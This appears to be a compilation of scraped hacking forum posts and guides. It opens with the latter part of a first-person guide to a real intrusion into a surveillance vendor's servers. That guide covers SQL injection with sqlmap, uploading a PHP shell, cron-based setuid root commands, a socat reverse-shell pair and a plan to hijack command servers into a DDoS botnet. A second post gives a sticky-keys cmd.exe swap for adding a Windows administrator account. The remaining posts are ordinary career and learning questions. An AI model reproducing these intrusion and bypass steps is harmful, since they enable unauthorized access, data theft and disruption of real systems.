a git subdomain and you can go to git.companyname.come/gitweb/ and browse their source code. 1. Is it horribly misconfigured? Maybe they have an ftp server that allows anonymous read or write access to an important directory. Maybe they have a database server with a blank admin password (lol stratfor). Maybe their embedded devices (VOIP boxes, IP Cameras, routers etc) are using the manufacturer's default password. 1. Is it running an old version of software vulnerable to a public exploit? Webservers deserve their own category. For any webservers, including ones nmap will often find running on nonstandard ports, I usually: 1. Browse them. Especially on subdomains that fierce finds which aren't intended for public viewing like test.company.com or dev.company.com you'll often find interesting stuff just by looking at them. 1. Run [nikto](URL This will check for things like webserver/.svn/, webserver/backup/, webserver/phpinfo.php, and a few thousand other common mistakes and misconfigurations. 1. Identify what software is being used on the website. [WhatWeb](URL is useful 1. Depending on what software the website is running, use more specific tools like [wpscan](URL [CMS-Explorer](URL and [Joomscan](URL First try that against all services to see if any have a misconfiguration, publicly known vulnerability, or other easy way in. If not, it's time to move on to finding a new vulnerability: 5) Custom coded web apps are more fertile ground for bugs than large widely used projects, so try those first. I use [ZAP](URL and some combination of its automated tests along with manually poking around with the help of its intercepting proxy. 6) For the non-custom software they're running, get a copy to look at. If it's free software you can just download it. If it's proprietary you can usually pirate it. If it's proprietary and obscure enough that you can't pirate it you can buy it (lame) or find other sites running the same software using google, find one that's easier to hack, and get a copy from them. For finsupport.finfisher.com the process was: * Start nikto running in the background. * Visit the website. See nothing but a login page. Quickly check for sqli in the login form. * See if WhatWeb knows anything about what software the site is running. * WhatWeb doesn't recognize it, so the next question I want answered is if this is a custom website by Gamma, or if there are other websites using the same software. * I view the page source to find a URL I can search on (index.php isn't exactly unique to this software). I pick Scripts/scripts.js.php, and google: allinurl:""Scripts/scripts.js.php"" * I find there's a handful of other sites using the same software, all coded by the same small webdesign firm. It looks like each site is custom coded but they share a lot of code. So I hack a couple of them to get a collection of code written by the webdesign firm. At this point I can see the news stories that journalists will write to drum up views: ""In a sophisticated, multi-step attack, hackers first compromised a web design firm in order to acquire confidential data that would aid them in attacking Gamma Group..."" But it's really quite easy, done almost on autopilot once you get the hang of it. It took all of a couple minutes to: * google allinurl:""Scripts/scripts.js.php"" and find the other sites * Notice they're all sql injectable in the first url parameter I try. * Realize they're running Apache ModSecurity so I need to use [sqlmap](URL with the option --tamper='tamper/modsecurityversioned.py' * Acquire the admin login information, login and upload a [php shell](URL (the check for allowable file extensions was done client side in javascript), and download the website's source code. Looking through the source code they might as well have named it [Damn Vulnerable Web App](URL v2. It's got sqli, LFI, file upload checks done client side in javascript, and if you're unauthenticated the admin page just sends you back to the login page with a Location header, but you can have your intercepting proxy filter the Location header out and access it just fine. Heading back over to the finsupport site, the admin /BackOffice/ page returns 403 Forbidden, and I'm having some issues with the LFI, so I switch to using the sqli (it's nice to have a dozen options to choose from). The other sites by the web designer all had an injectable print.php, so some quick requests to: URL and 1=1 URL and 2=1 reveal that finsupport also has print.php and it is injectable. And it's database admin! For MySQL this means you can read and write files. It turns out the site has magicquotes enabled, so I can't use INTO OUTFILE to write files. But I can use a short script that uses sqlmap --file-read to get the php source for a URL, and a normal web request to get the HTML, and then finds files included or required in the php source, and finds php files linked in the HTML, to recursively download the source to the whole site. Looking through the source, I see customers can attach a file to their support tickets, and there's no check on the file extension. So I pick a username and password out of the customer database, create a support request with a php shell attached, and I'm in! __-- 5 -- (fail at) Escalating__ ___________ &lt; got r00t? &gt; ----------- \ ^__^ \ (oo)\_______ (__)\ )\/\ ||----w | || || ^^^^^^^^^^^^^^^^ Root over 50% of linux servers you encounter in the wild with two easy scripts, [Linux_Exploit_Suggester]( URL and [unix-privesc-check](URL finsupport was running the latest version of Debian with no local root exploits, but unix-privesc-check returned: WARNING: /etc/cron.hourly/mgmtlicensestatus is run by cron as root. The user www-data can write to /etc/cron.hourly/mgmtlicensestatus WARNING: /etc/cron.hourly/webalizer is run by cron as root. The user www-data can write to /etc/cron.hourly/webalizer so I add to /etc/cron.hourly/webalizer: chown root:root /path/to/my_setuid_shell chmod 04755 /path/to/my_setuid_shell wait an hour, and ....nothing. Turns out that while the cron process is running it doesn't seem to be actually running cron jobs. Looking in the webalizer directory shows it didn't update stats the previous month. Apparently after updating the timezone cron will sometimes run at the wrong time or sometimes not run at all and you need to restart cron after changing the timezone. ls -l /etc/localtime shows the timezone got updated June 6, the same time webalizer stopped recording stats, so that's probably the issue. At any rate, the only thing this server does is host the website, so I already have access to everything interesting on it. Root wouldn't get much of anything new, so I move on to the rest of the network. __-- 6 -- Pivoting__ The next step is to look around the local network of the box you hacked. This is pretty much the same as the first Scanning &amp; Exploiting step, except that from behind the firewall many more interesting services will be exposed. A tarball containing a statically linked copy of nmap and all its scripts that you can upload and run on any box is very useful for this. The various nfs-* and especially smb-* scripts nmap has will be extremely useful. The only interesting thing I could get on finsupport's local network was another webserver serving up a folder called 'qateam' containing their mobile malware. __-- 7 -- Have Fun__ Once you're in their networks, the real fun starts. Just use your imagination. While I titled this a guide for wannabe whistleblowers, there's no reason to limit yourself to leaking documents. My original plan was to: 1. Hack Gamma and obtain a copy of the FinSpy server software 1. Find vulnerabilities in FinSpy server. 1. Scan the internet for, and hack, all FinSpy C&amp;C servers. 1. Identify the groups running them. 1. Use the C&amp;C server to upload and run a program on all targets telling them who was spying on them. 1. Use the C&amp;C server to uninstall FinFisher on all targets. 1. Join the former C&amp;C servers into a botnet to DDoS Gamma Group. It was only after failing to fully hack Gamma and ending up with some interesting documents but no copy of the FinSpy server software that I had to make due with the far less lulzy backup plan of leaking their stuff while mocking them on twitter. Point your GPUs at FinSpy-PC+Mobile-2012-07-12-Final.zip and crack the password already so I can move on to step 2! __-- 8 -- Other Methods__ The general method I outlined above of scan, find vulnerabilities, and exploit is just one way to hack, probably better suited to those with a background in programming. There's no one right way, and any method that works is as good as any other. The other main ways that I'll state without going into detail are: 1) Exploits in web browers, java, flash, or microsoft office, combined with emailing employees with a convincing message to get them to open the link or attachment, or hacking a web site frequented by the employees and adding the browser/java/flash exploit to that. This is the method used by most of the government hacking groups, but you don't need to be a government with millions to spend on 0day research or subscriptions to FinSploit or VUPEN to pull it off. You can get a quality russian exploit kit for a couple thousand, and rent access to one for much less. There's also metasploit browser autopwn, but you'll probably have better luck with no exploits and a fake flash updater prompt. 2) Taking advantage of the fact that people are nice, trusting, and helpful 95% of the time. The infosec industry invented a term to make this sound like some sort of science: ""Social Engineering"". This is probably the way to go if you don't know too much about computers, and it really is [all it takes to be a successful hacker](URL __-- 9 -- Resources__ Links: * URL * URL * URL * URL * URL * URL * URL * URL * URL * URL (all his other blog posts are great too) * URL (start at Exploit writing tutorial part 1) * URL One trick it leaves out is that on most systems the apache access log is readable only by root, but you can still include from /proc/self/fd/10 or whatever fd apache opened it as. It would also be more useful if it mentioned what versions of php the various tricks were fixed in. * URL Get usable reverse shells with a statically linked copy of socat to drop on your target and: target$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:PORTNUM host$ socat file:`tty`,raw,echo=0 tcp-connect:localhost:PORTNUM It's also useful for setting up weird pivots and all kinds of other stuff. Books: * The Web Application Hacker's Handbook * Hacking: The Art of Exploitation * The Database Hacker's Handbook * The Art of Software Security Assessment * A Bug Hunter's Diary * Underground: Tales of Hacking, Madness, and Obsession on the Electronic Frontier * TCP/IP Illustrated Aside from the hacking specific stuff almost anything useful to a system administrator for setting up and administering networks will also be useful for exploring them. This includes familiarity with the windows command prompt and unix shell, basic scripting skills, knowledge of ldap, kerberos, active directory, networking, etc. __-- 10 -- Outro__ You'll notice some of this sounds exactly like what Gamma is doing. Hacking is a tool. It's not selling hacking tools that makes Gamma evil. It's who their customers are targeting and with what purpose that makes them evil. That's not to say that tools are inherently neutral. Hacking is an offensive tool. In the same way that guerrilla warfare makes it harder to occupy a country, whenever it's cheaper to attack than to defend it's harder to maintain illegitimate authority and inequality. So I wrote this to try to make hacking easier and more accessible. And I wanted to show that the Gamma Group hack really was nothing fancy, just standard sqli, and that you do have the ability to go out and take similar action. Solidarity to everyone in Gaza, Israeli conscientious-objectors, Chelsea Manning, Jeremy Hammond, Peter Sunde, anakata, and all other imprisoned hackers, dissidents, and criminals! "

If you have boot from CD enabled in BIOS then this will work. First thing to do is have a kali linux live cd handy. So go ahead and boot into live cd on machine you need admin on. Second, go to places on top menu of kali and select the hdd that the Windows partition is on. Doing this will mount the hdd if not you may need to mount the hard drive manually via terminal. Next go into hdd. Then navigate to Windows folder. Then navigate to system32 folder. Once you are in System32 directory, go down and search for file SETHC.exe and right click on it and rename it to SETHC.bak Then find file CMD.exe and right click and select copy. Right click on empty space and select paste. Once it is pasted rename it to SETHC.exe Exit kali linux and restart Windows machine. Once you arrive at password prompt, press shift key 5 times. Once you press it a command prompt with administrator privileges will open. In the prompt, type: net users This will display the local accounts on machine. You can either change current password or create a new admin account. I prefer creating a new admin account. In command prompt type: net user /add useraccountname mypassword net localgroup administrators useraccountname /add Then login as admin. You can and should rename SETHC.bak back to SETHC.exe for security reasons as pressing sticky key command shift 5 times will call admin cmd prompt at anytime.

The site was visibly aged and obviously poorly put together, but me being more of a programmer than a hacker (it was a programming class, somewhat ironically), I never got too curious about security. Sometime during the class, there was a really big chain mail going around to all the students in the class (the course used its own mail system). It was amusing, but when I opened it one day an alert dialog popped up with some random text (don't remember exactly what it was). I knew enough to look into the developer tools and read the source, and found out that someone had written a script tag with code for an alert dialog in their message. It wasn't being escaped, so any code written there was executed, no questions asked. Like I said, me having almost no hacking knowledge at the time I didn't really think of much I could do with it. I though about some code that would change the text colour in CSS to white (as a sort of prank), so as to make it unreadable. But I was lazy and my knowledge of javascript wasn't enough for me to know how to do it right there, so I didn't do anything and eventually forgot about it. Probably a good idea, since it'd be easy for them to know it was me and they'd freak and get me in trouble. My question is: what is the worst that could've been done with this? I have heard of something like this with Twitter, where a tweet kept retweeting itself for ever, but would something more malicious be possible?"

If anyone can write a really simple run down of an exploit that would be great. The payload is the code that gets injected. There must be limitations on how big the code must be, and what it can do in terms of both permission and not fucking everything up. Could anyone provide some examples of these limitations/what an average payload would try to achieve? Yeah, that is all. Thanks. "

If you find this helpful and to keep you updated. Thanks One of the questions we keep getting frequently from businesses as well as others is why do hackers hack? What do they get from doing damage? Is it just about money? Or ego? Well, there are numerous reasons why hackers hack a website or an app or even servers. And this is nothing new. In the early days of the internet, hackers hacked websites or took down services just to show they could break a system. So, you could say it was more about their ego or showing off or sometimes just to make a point that something can be broken. These days, it's way more complicated and so are the intentions behind such activities. Before deep-diving into the reasons which motivate hackers to hack, let us know more about the 3 common categories of hackers and some of the common hacking techniques they use. What are the 3 Categories of Hackers? Generally, hackers are classified into three categories based on their motives behind hacking: 1. Black Hat Hackers: Black hat hackers are notoriously known to infiltrate into networks and systems by creating and spreading malware. Basically, they are the bad hackers. They are generally motivated by monetary gains but on many occasions, they just do it for fun also. From amateurs to expert cybercriminals, anyone can be a black hat hacker as long as they are hacking with the motive of spreading malware and stealing personal data. 2. White Hat Hackers: Not all hackers are bad, some are white hat hackers also. Commonly known as ethical hackers, white hat hackers are often contracted by businesses and government agencies to check for security vulnerabilities. They implement commonly known cybersecurity techniques like penetration testing and thorough vulnerability assessments to ensure that the security systems are in place. 3. Grey Hat Hackers: These hackers have characteristics from both black and white hat hackers, but they generally carry out their hacking missions without seeking permissions from anyone. Mostly they do report the vulnerabilities found to the concerned parties, but they also demand compensations in return. If not rewarded properly, they might exploit the vulnerabilities as well. Why Do Hackers Hack? 1. Steal/Leak Information I am sure you guessed this. One of the most common reasons for hackers to hack is to steal or leak information. This could be data and information about your customers, your internal employees or even private data specific to your business. These are cases where hackers typically go after big targets in order to get the most attention. Some of the biggest examples are the Ashley Madison hack or the Starbucks app hack. In the Ashley Madison hack, hackers were able to break into the customer database and get access to all the information including many private pictures of popular celebrities. This incident was a big shakeup in the Internet world which also affected private lives of many people. A lot of times, hackers also steal information in order to assume your personal identity and then use it for something else like transferring money, taking a loan, etc. Such incidents have increased after Internet banking and mobile banking have started to become more popular. With the growth of smartphones and mobile devices, the potential for monetary gain through hacking has also increased. Many big businesses have fallen prey to this - Sony, Target, Yahoo, Equifax, eBay, HomeDepot, Adobe, to just name a few. Even though there has been a lot of media attention about all the above companies being hacked, most businesses still believe this won't happen to them. By not being proactive about security, you are only putting your data at risk. 2. Disrupt Services Hackers just love to take something down. And then also leave a statement on the website - more on that later. But hackers have successfully taken down many services by creating bots that overwhelm a server with traffic, thus, leading to a crash. It is known as a DoS (Denial of Service) attack and can put a companys website out of service for a while. These days, there's also DDoS or Distributed Denial of Service attacks which use multiple infected systems to take down a single major system leading to a denial of service. There are other ways also, like infecting a large network with malicious software inserted onto one computer either through email or otherwise which leads to a chain reaction affecting the whole network. Server disruption attacks usually have their own personal motive. Mainly, it is to render a service or website useless. Sometimes it can also be to make a point. 3. Make a Point The hackers who fall into this category are very interesting. They don't care about money or data. They seem to feel that they have a higher purpose in life. They want to steal information or disrupt your network in order to make a point. Again, going back to the Ashley Madison hack, the hackers had access to account details of 32 million users but before they made this public, the hackers left a message on the website to inform everyone on what they are done. They also mentioned what they thought about the website and why they thought a service like this was immoral. Here's a screenshot of the message left on the website by the hackers:  4. Money This is what everyone usually fears about. We've seen many businesses reach out to us at the stage when they have already been hacked and a hacker is demanding money. Hackers not only hack businesses and ask for ransom but they also try hacking into regular user accounts and try to take advantage of things like online banking, online retail, etc. where financial transactions are involved. Last year also saw the biggest ransomware attack called WannaCry where millions of computers around the world were hacked and users had to pay a ransom to get back access to their computers. 5. Driven by Purpose - Hacktivism, Idealism, Political Motives Many hackers are also drive by a specific purpose. Sometimes, this comes out only when they get caught. Some of them aim to be idealists and take it upon themselves to expose injustice, some have political motives, some simple target the government, and so on. A major example is a hacktivist group called Anonymous who have been popular around the world for challenging and taking down many governments. These hackers can target religious groups, governments, movements, to promote a particular agenda. Another example of a politically driven agenda was when France was having an election last year. In fact, at the beginning of May, we all got to know that Emmanuel Macron, President-elect for France, had his presidential campaign emails leaked following a hack. Giving the timing of the hack, many speculate that it was done with a purpose  to sway the votes. And so are the speculations about the US presidential elections when Donald Trump became President. What are the Most Common Hacks? When it comes to hacking techniques, the list is surprisingly long. However, we will only talk about some of the most commonly employed techniques by threat actors: 1. Phishing Phishing is a commonly known hacking technique where a hacker creates a replica of some web page in order to steal money or personal information of users. 2. UI Redress Similar to Phishing, UI redress is a hacking method where a hacker creates a fake or hidden user interface with some inappropriate content. 3. Denial of Service (DoS\DDoS) One of the most common types of attacks, DoS or DDoS (Distributed Denial of Service) is employed to disable or crash a server. Hackers generally do this by sending tonnes of server requests via bots. 4. DNS Spoofing DNS spoofing or DNS cache poisoning is used by hackers to infect DNS servers and redirect internet traffic to a similar but fraudulent website. 5. SQL Injection Using this technique, hackers place malicious code in SQL statements and are able to access and control sensitive databases. 6. Brute force Considered as one of the simplest methods gain access, brute force is a hacking technique where a hacker tries numerous combinations of usernames and passwords until he is able to get into the target system. 7. Man in the Middle Attack In this attack, a hacker positions himself in the middle of a conversation happening between a user and an application. Mostly, the motive is to gain sensitive user or business information. What Can You Do To Be Safe Businesses often tend to give it away rather easily because they think they will not be hacked. Some of them also have a reactive nature where they'd only do something once a situation arises. The fact is that hacks happen all the time. They've been happening for years and they've only increased with time. It happens to business and users, all shapes and sizes. One of the best things you can do as a business is to proactively test the security of all your interaction entities - websites, mobile apps, networks, etc. by performing penetration tests either through service providers or using an automated security testing tool like Appknox. Run these tests on a regular basis and make sure your systems are up to date. Additionally, always keep an action plan ready on what to do if a breach happens. It's always better to be safe than be sorry Kindly upvote and follow. If you find this helpful and to keep you updated. Thanks"

I find them very enjoyable and have really learned a lot about different tools and such. I can safely say that for my age I have gotten fairly consistent/good with these CTFs. While they are amazingly fun in themselves I have found myself wanting to look further. Hacking, cyber security, and penetration testing all sound really interesting to me and I want to start looking into these fields. Essentially what I'm asking is how can I get into hacking and penetration testing, as a beginner, with little experience only from CTFs. I have friends who are also interested in this and are in the same position as myself. We would like to ""penetration test"" each others computers or something like that as a learning experience. (Sorry if that sounds really cringe. I am new to this) Where can I get started, what are some good resources to start learning, and how can I transition from only doing CTFs for fun to actually having knowledge about hacking and cybersecurity?"

258,cybersecurity,HowToHack,What You Need to know to become a Hacker,1,fc2w2e,https://www.reddit.com/r/HowToHack/comments/fc2w2e/what_you_need_to_know_to_become_a_hacker/,2020-03-02 10:40:04,"So this question is asked quite frequently, and I thought it would make the most sense to explain what you'll need to know to become a hacker in this post. Now, before we get into the technical details, first some background about me. I have a Master of Science in Computer Science with a concentration in Telecommunications and Network Security. I have a Bachelor of Science in Information Technology with a concentration in Computer Forensics and a double minor in Computer Science &amp; Cybersecurity. And I have been a member of a Red Team for the past couple of years. So what are you going to need to know to be a Hacker? Here are the key concepts from the Study Guide that I used to prepare for an exam to get my Red Team Job Here's the list: - Programming/Scripting. You'll need to know basic programming concepts, and how to read and interpret scripts/code. You will need to be familiar with Shell scripting (e.g., cmd, wmic, bash), Interpreted languages (e.g. Python) and how to Interpret source code and scripts (e.g., Flow, variables, loops). You should be pretty familiar with a Scripting and/or programming language. You'll be able to find tons of information online regarding learning how to code. - Computer Architecture &amp; Networking. You'll need to understand the fundamentals and theory behind computer design, computer networking, and basic computing concepts. Some things you should be aware of is, Computer Math numbering systems and conversions, Computer concepts (e.g., CPU architectures, virtualization), Memory organization and layout, Storage concepts (e.g., hard disk drives, solid state drives) and the difference between kernel and user space. A good resource for learning this is [Computer Organization and Design ARM Edition:The Hardware Software Interface](URL - Operating Systems (Windows and Linux/UNIX). You'll need to learn of computer systems administration, software interactions and I/O interactions in either Windows or Unix implementations. Some things you'll need to know are Standard administrative commands, Local system configurations, Data security and integrity protection, Antivirus concepts and file systems. A Great resource for learning Operating System is the book [Operating System Concepts Tenth Edition](URL That website contains tons of useful information for that book including slides and study guides. But as a prerequisite for learning Operating Systems you should already be familiar with basic data structures, computer organization, and a high-level language, such as C or Java. - Network Design. You'll need to be aware of the operations, management, and maintenance of computer networks, protocols and standards and how they integrate with one another. Some things you should be familiar with are IP / subnetting, Ethernet, Routing, Network layout and design (i.e., network typology) and Networking device concepts (e.g., routers, firewalls, intrusion detection systems). There is a great CCNA prep course available [here](URL that you can learn this from. A good book to learn about Networking is [Computer Networking: A Top-Down Approach, By James F. Kurose](URL [This](URL is also a good resource for learning about networks from a security point of view - Networking Applications and Services. You'll need to know Protocols, and ports for standard network services, Network services and ports on standard Windows/Unix installs, Network-related commands and Network service administration and configuration. For this you can use the resources from above. So those are the Fundamentals that you need to know to become a Hacker. Once you have those down, you can move onto learning some more advanced concepts. Some of those concepts would be: - Information security tools and techniques: Network monitoring, Network mapping, Vulnerability scanning, Penetration testing - Offensive information security - Digital forensics and data recovery - Voice/data communications (satellite, RF, wireless, and telecommunications networks) - Public key infrastructure and encryption systems - Command line tools - Network traffic analysis - Computer and network forensics - Vulnerability and malware analysis - Low level protocol and packet analysis So I am aware that many people want to become a Hacker or Penetration Tester professionally so I will briefly be discussing how one can best do that. **Education**: For a Degree, i'd recommend a degree in Computer Science, Computer Engineering, Computer Security, Cybersecurity (Technical Track), Cyber Operations or Information Technology. I'd recommend attending a school that is either an NSA Accredited [CAE-CD](URL or [CAE in Cyber Operations](URL **Experience**: You're going to need some experience if you're going to become a Pen Tester or Red Team Member. Some good experience to gain would be UNIX/Linux system administration, Windows system administration, Network Security, Network Administration - security and engineering, networking equipment (routers/firewalls/switches) and VPN administration **Certifications**: Some good entry level Penetration Testing Certifications would be the OSCP, very practical and well respected. And the Security + is generally a baseline for Security Jobs. And i'd advise against the CEH, its not practical at all and you can just memorize the answers and pass without actually knowing how to hack anything **Good ways to practice**: Theoretical knowledge is nothing if you cant practice it. There are a number of different ways you can get experience in Offensive Security (Legally of course). Capture the Flag Events such as the National Cyber League are great ways to apply your knowledge. And HacktheBox (while a bit more advanced) is probably the closest you can get to a real world Network Penetration Testing environment. **Conclusion**: I couldn't cover everything here, but I hope I was able to give you guys some solid knowledge that you can build on. Feel free to ask me any questions or send me a message if you have any questions. Thanks!"

So one day I decided to take many notes! It helps me when I want to call to mind any topics from books. I dont need to completely re-read books. I can read my notes and they will completely cover all the material I need. For thats why I think it would be nice to share my notes with other people. In fact, notes are a summary of the most important material in books. We all know how even the most scientific books contain a lot of extra (water) information. So, for example, I cut books in the size of 1000 pages and do their presentation on 150-200 pages. I hope that material can help you with your education! Here I get a link to dropmefiles with my notes: [Link to books on Dropmeiles.com](URL I have a lot of others, but for first I decided to share these ones."

I want to show how vulnerable some IoT devices are. I was wondering if there are any tutorials or devices that are known vulnerable and not patched. Specifically thinking about SOHO routers and CCTV cameras. I'd love to also buy 7-10 other devices for students to try and hack. Was thinking maybe an IP drone or some baby devices. Does anyone know of any tutorials online or places I could be looking for these. I'm going to buy the devices and create a demo to show some students in a local cybersecurity meetup chapter

So I joined my school's Cybersecurity club about a month ago. We had a speaker come in this Thursday who has been participating at DEF CON for three years. I was interested because I heard it was a hacking convention. I don't know anything about hacking and I want to be able to compete in DEF CON 28 or DEF CON 29. I have been interested in hacking but know zilch about it. Do you guys have any resources for a newbie?

My main resourcess are free learning videos and texts from the web. With that said, here is my problem: I was given an old Fujitsu Slim Workstation (Futro S100) from a friend. His Company used it back in 2009. It is running on an Embedded Linux OS (eLux 2.2 RL). When I am booting this machine I end up on an Desktop which only gives me the option to connect to (Scout ?) Servers and some peripharal settings. I can't create files or access the internet (no browser installed). Obviously I have no admin rights on that machine. So I thought maybe I can hack my way into the machine when it's hooked up to my network via another PC running Kali Linux on my network to acquire those. I set up a VM on my PC running Kali, hook the other machine up to my network via an ethernetcable, look up its IP adress and run a search for open Ports with SPARTA. This Scan shows me that Port 111 (tcp,udp, rpcbind, portmapper), 4000 (tcp, remoteanything), 5681 (tcp, ncxcp), 5900 (tcp, vnc, VNC (protocol 3.3; Locked Out) and 22123 (tcp). I looked for exploits with the metasploit console frame and tried some of those, but I am always getting ' Exploit Completed, but no session was created' as a result. I am running bruteforce attacks against the ports with Hydra and the rockyou list but had no succes yet. Looking for more information on the OS and open Ports did not work as well. I am not looking for a walkthrough for the problem, but I hope you guys and gurls could give me a hint or idea what I should look into or what I am doing wrong. &amp;#x200B; I know it is maybe faster to just set up a new OS with a flashdrive on the machine, but I am trying to use it as a kind of a trainingstool to get a better understanding of Kali and the functionality of Computers ( Something like a physical CTF, sounds stupid I know). TL;DR: I got a Futro S100 Fujitsu workstation from 2009, running eLux 2.2 RL and I try to aquire adminrights with another machine on the same network running Kali. Because I am an uneducated scriptkiddie, I am overwhelmed with the possibilities Kali is providing me, so I need some advice on how to do it. #"

The TLDR of it is that it feels like a waste of time and I kinda hate college. I mostly wanted to go to college for networking with other people and the experience, but I haven't really met anyone yet that I believe would be a good mentor to me and so far college just feels like a really expensive high school. I currently go to a community college and the plan was to transfer to a state university, but I don't know if I want to do that. Is there even a point? Is a cybersecurity degree worth anything? For the amount of time and money I spend taking useless general ed classes I could be getting real work experience and getting useful certifications. Plus, it seems like a degree isn't really worth a lot. I see a lot of job openings around here that require either a cert or a BA and they pay barely over minimum wage. I'm entertaining the idea of dropping out and pursuing the bigger name certs. Does anyone have any experience or advice with this? Some of my friends say it's a good idea, while others say I should wait for college to ""get good"". Honestly though, I don't really want to spend more time and money if I don't really need to. I feel so frustrated right now."

I use some applications hosted internally here at my company that are accessed by a web application. In order to use the functionality of these applications, we have to login via a web portal. These logins are local to the applications themselves and are not sent back to any kind of AAA server. So lets say I have a server named t1000.

I've applied for an apprentice/beginner level job as a technical auditor/pentester, and I have to say I am both really excited and really stressed as I do not want to miss that opportunity. Part of the interview consists of a 1 hour long technical test on a computer where I'm told my role will be to find as many vulnerabilities as I can and to report them. As this is a 1 hour long exercise (and also will be my first experience in performing an audit, to be honest), I don't really know what to expect and how to proceed. I have a little experience in defensive security (so I have some cybersecurity knowledge already), but not in offensive security, so I'm not 100% lost but not completely ready either. I have some plan in mind of stuff I should do: * First, try to see if the BIOS is locked. If it's not, you can boot on a live USB stick which is already a major flaw in itself. * Check the firewall settings/do a port scan. Check for unencrypted open protocol ports like Telnet, HTTP, FTP, etc. * Run major vulnerabilities checkers, like Spectre, Meltdown, RAMbleed, Zombieload, all the big names you see in media. A mediatised flaw is always more dangerous as it is prone to have available exploits. * Check access controls: be sure accounts can only do what they are allowed to do. *I am still documenting myself on how to properly do it, so any link or help is greatly appreciated!* * Check for plain text passwords. * I don't know what permissions I will have on the computer I will have access to, so I doubt any pentesting framework could be installed (also definitely not in 1 hour anyway). Are there any tools I should look at just in case that might be useful though? * Take notes while I'm testing, and redact a proper report with my name, the scope of the audit, what I did and what I found, and what is the impact of what I found This is basically all I can think of. Did I miss something important? I thought about doing code analysis, could it be relevant? Thanks in advance for any help you can provide!"

I dont understand how the information is stored within the memory and where it goes from there. I have read lots of articles online and I still do not quite understand it. I should add, I have a very tough time understanding material just through reading, I have been looking for diagrams but have yet to find any. Im hoping someone on here can either explain it or can point me in the right direction. Thanks!"

The goal is to have an account with administrator rights AND to leave a .txt file with our name on the professors computer. We can use any computers in the lab, and we have to play by these rules: Rules: 1. Students cannot work together, but are not forbidden from working with non-club members as long as we are notified (if you dont want the professor to know, notify the sysadmin). 2. Computers outside the lab can be used, but not hacked (for example, students can look at shared folders but not hack other computers) 3. Hacking absolutely must not result in a denial of service for any other student or faculty member, no matter how brief (The professor gave later clarification that a minor (less than a few minutes) denial of service solely on his systems in the lab was not a disqualifier) 4. Hacking the accounts of faculty members and students, with the sole exception of the professor's account, is prohibited 5. Hacks cannot cause lasting damage to any computer, server, WiFi network, or website 6. Students are allowed to use a personal device (phone, laptop, tablet, etc.) and USB drives Some computer info from using a scanning program I wrote, plus tidbits I know (this applies to all computers in the lab): OS: Windows 8.1 Pro Version = ""6.3.9600""; Manufacturer = ""ByteSpeed LLC""; Model = ""ByteSpeed Value H81M-C"" Roles = {""LM_Workstation"", ""LM_Server"", ""SQLServer"", ""NT"", ""Potential_Browser""}; BootupState = ""Normal boot""; OSArchitecture = ""64-bit""; OSLanguage = 1033; OSProductSuite = 256; OSType = 18; Cmd, regedit, and run are all disabled All ports are filtered from outside scanning &amp;#x200B; I figured the easiest thing to start with was escalating my privileges to admin on a computer in the lab, then use PsExec or a RDP program to create the txt file on the target computer. I got around the disabled cmd by writing a python program to pass commands instead of the command line. Any command passed through the program is run at the same trust level as the program itself. I found out because theyre lab computers, powershell is not only enabled, but it also isnt scanned as intensively as it is on other computers (it will catch mimikatz, but it wont catch things like PowerView or other powersploit one liners. &amp;#x200B; Because powershell was enabled, I decided to use that as my starting point. I acquired a list of users and a list of local admins. I looked for any way to escalate privileges to get admin, and I found an unquoted service path which I planned to exploit to run my python command program as system, then add myself to the local admin group. Unfortunately, while I could write to the C drive, I couldnt write to Program Files or any of its subdirectories. The only other thing I found was the panther.xml file but, as expected, the password was removed from it. I also looked for CVEs but I only found vulnerabilities in old windows XP systems that were located outside the lab. &amp;#x200B; I then turned my focus to the GPP password. I pulled the file and copied the cPassword string, took it home, ran it through a GPP-decrypt script and got an output. The output was a little strange looking, and looked to be a far better password than I wouldve given the sysadmin credit for. I came back the next day and attempted to use it to login as local admin. Unfortunately, something was wrong. I was aware that the GPP password had been patched by Microsoft, but I had figured if it was still in the file that meant they hadnt updated it. Either it had been patched then changed post-patch or the decryptor was wrong. Either way, a bust. &amp;#x200B; I decided to try something a little more brute force, so I asked the professor if using external software was ok. He said as long as it didnt violate one of the rules, it was fine. I burned a password reset key at home and tried to simply reset the local admin password. Unfortunately, the BIOS is locked with a password and I cant get to the CMOS battery AND reassemble the computer fast enough for the professor to not notice. &amp;#x200B; Im totally stumped here. Everything Ive tried has failed, and Im not finding much else I can do as a normal user that will let me escalate to local admin. The contest will end in 6 days. I can bring a laptop if needed. Any suggestions on how to proceed?"

This has worked out incredibly well, the feedback has been great, and we've peaked at nearly 600 followers in around three weeks, which is awesome. The past few streams have covered Hack The Box, VulnHub, and some exploit development. However, I think that we can do something even better. &amp;nbsp; I've designed a base lesson plan for a zero to hero course in network penetration testing/ethical hacking. The course will be delivered weekly on Twitch and build from lessons learned in the previous week. It will provide an opportunity for those interested in becoming an ethical hacker / penetration tester the chance to learn the practical skills necessary to work in the field. Throughout the course, we will develop our own Active Directory lab in Windows, make it vulnerable, hack it, and patch it. We'll cover the red and blue sides. We'll also cover some of the boring stuff like report writing :). &amp;nbsp; All videos will be available on demand immediately after the Twitch stream and the next day on my website and on YouTube. The goal is not only to create an environment where students can learn in real time, but a resource for future students (and those in different time zones) to access it for a long time. The course will be 100% free and I will never ask for money, though I have a Patreon and Twitch has subscriptions/donations if you wish to do so. &amp;nbsp; Here is a quick look at a barebones lesson plan. I will be adding on to this as the weeks go on: &amp;nbsp; **1 - Setting Up A Penetration Testing Environment** - This will focus on setting up a lab environment, specifically VMWare, Kali Linux, and our lab VMs. The lesson will briefly introduce important aspects of each set up (e.g. Snapshots in VMWare, the Kali Linux toolset, etc.) with the intention to build upon those aspects in later lessons. &amp;nbsp; **2 - How to Keep Notes Effectively** - This lesson will cover the importance of note taking from a pentester standpoint. The lesson will introduce the Kali Linux built-in note-taking application, KeepNote, and discuss how to take notes effectively. Taking notes during a penetration test is incredibly important as it allows a pentester reference points when writing their final report, discussing timelines with their team or manager, or even discussing specifics of a pentest with a client. &amp;nbsp; **3 - The Legal Side of the House** - This lesson will cover the important legal aspects that a pentester must know prior to conducting a penetration test. For example, having a rules of engagement document that specifies which networks can be attacked and what attack methods can be used. Knowing the common legal documents that a junior pentester may encounter will give him or her an advantage in their early careers. &amp;nbsp; **4 - Introductory Linux** - This lesson will briefly cover the important Linux terminal commands needed to use Kali Linux. Some of the topics that will be covered are: navigating the file system, users and privileges, common network commands, bash scripting, and much more. &amp;nbsp; **5 - Introductory Python** - Similar to Linux, we will spend some time learning basic Python 